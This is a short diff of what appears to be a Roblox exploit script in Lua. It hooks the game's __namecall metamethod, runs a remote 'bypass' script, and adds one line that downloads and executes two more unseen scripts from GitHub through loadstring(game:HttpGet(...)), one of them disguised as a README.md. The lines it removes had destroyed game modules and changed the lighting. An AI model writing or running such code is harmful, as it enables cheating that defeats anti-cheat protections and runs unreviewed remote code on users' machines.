@@ -734,8 +734,4 @@ mt.__namecall = newcclosure(function(remote,...)
 end)
 setreadonly(mt,true)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
-game:GetService("CorePackages").Packages._Index.RobloxRequests.RobloxRequests.lib.html.voidelements:destroy()
-game:GetService("ReplicatedStorage").ClientModules.EntityModules.Void:destroy()
--- Glow
-game.Lighting.GlobalShadows = false
-game.Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CQWEO/Gyeyeg/main/Moert'))()loadstring(game:HttpGet('https://raw.githubusercontent.com/CQWEO/Uyyer/main/README.md'))()
